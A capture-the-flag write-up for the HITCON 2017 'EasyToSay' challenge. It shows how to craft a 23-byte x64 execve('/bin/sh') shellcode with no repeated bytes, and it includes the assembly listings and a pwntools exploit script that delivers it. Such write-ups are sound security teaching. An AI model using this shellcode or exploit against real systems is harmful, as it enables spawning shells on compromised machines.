---
title: "EasyToSay | Hitcon2017"
categories: ["pwn"]
tags: ["shellcode"]
Points: 144
Solves: 139
---

This is a writeup explaining how I wrote a shellcode payload bypassing a size limit and avoiding repeated bytes.

## Overview
After reversing the binary we easily see the program will run any shellcode we give it with the following conditions:
1. is shorter than 24 bytes
2. does not have repeated bytes

After a little debugging we also see that before executing our shellcode all registers are zero'd.


## Solution

Here I will go through the ideias I had before arriving at the final solution.

### 1. Basic x64 shellcode
First lets try a basic x64 shellcode and see if there are any repeating bytes. That looks something like:
1. put '/bin/sh\x00' on the stack
2. put that stack address in `rdi` (filename)
3. make `rsi` (argv) equal 0
4. make `rdx` (envp) equal 0
5. call the execve syscall (a syscall table for x64 can be found [here](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/))

We get step 3 and 4 for free since all registers are already zero'd from the start. The rest looks something like this:

```nasm
68 2f 73 68 00      push   0x0068732f   ; 1. '/sh\x00'
68 2f 62 69 6e      push   0x6e69622f   ; 1. '/bin'
48 89 e7            mov    rdi, rsp     ; 2. Put the '/bin//sh' addr in rdi
b0 3b               mov    al, 0x3b     ; 5. Mov to rax the execve syscall number
0f 05               syscall             ; 5. call it
```

### 2. Can't have 2 push's
As we can see on the left there are repeated bytes in the first two intructions.
Having 2 `push` instructions is not an option since the opcode will be repeated. Lets try to do it with a `mov` instead of a `push` and see if we have better luck.

```nasm
c7 04 24 2f 73 68 00    mov    DWORD PTR [rsp], 0x0068732f
68 2f 62 69 6e          push   0x6e69622f
48 89 e7                mov    rdi, rsp
b0 3b                   mov    al, 0x3b
0f 05                   syscall
```

That is better but `/bin/sh\x00` contains two `/` (2f) and that is a problem since it is a repeated byte. Also the byte 0x68 is repeated since it is the opcode of `push` and also the letter `'h'`. Let's try another version:

```nasm
49 bc 2f 62 69 6e 2f    movabs r12,0x68732f6e69622f
73 68 00
41 54                   push   r12
48 89 e7                mov    rdi, rsp
b0 3b                   mov    al, 0x3b
0f 05                   syscall
```

Closer! Now we only have to somehow remove the extra `/`.

At this point I tried using just `sh` or `bash`, but the execve syscall only works with a full path, making the two slashes necessary.


### 3. Masking the repeated '/'
Now the plan is to mask the slash. Instead of putting a slash there directly we want to:
1. mask `'/'` by sending the value of `'/' - 1`
2. unmask it by adding `1`, making it a `'/'` again.

```nasm
49 bc 2f 62 69 6e 2e    movabs r12,0x68732e6e69622f
73 68 00
41 54                   push   r12
fe 44 24 04             inc    BYTE PTR [rsp+0x4]
48 89 e7                mov    rdi, rsp
b0 3b                   mov    al, 0x3b
0f 05                   syscall
```

That worked! No repeated bytes and a length of 23. Just under the 24 byte limit!


## Exploit
```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

def go():
    s = process("./easy_to_say")
    # s = remote("52.69.40.204", 8361)

    shellcode = asm(\
    """
        mov r12, %s
        push r12
        inc byte ptr [rsp+0x4]
        mov rdi, rsp
        mov al, 59
        syscall
    """ % (hex(u64("/bin" + chr(ord('/') - 1) + "sh\x00"))))


    # Check if there are any repeated bytes
    for i in range(len(shellcode)):
        for j in range(i):
            if shellcode[i] == shellcode[j]:
                print i, "==", j, "(", hex(ord(shellcode[j])), ")"
    print "There are %d bytes repeated" % (len(shellcode) - len(set(shellcode)))
    print "Shellcode of len: ", len(shellcode)
    print disasm(shellcode)

    s.sendline(shellcode)
    s.interactive()

go()
```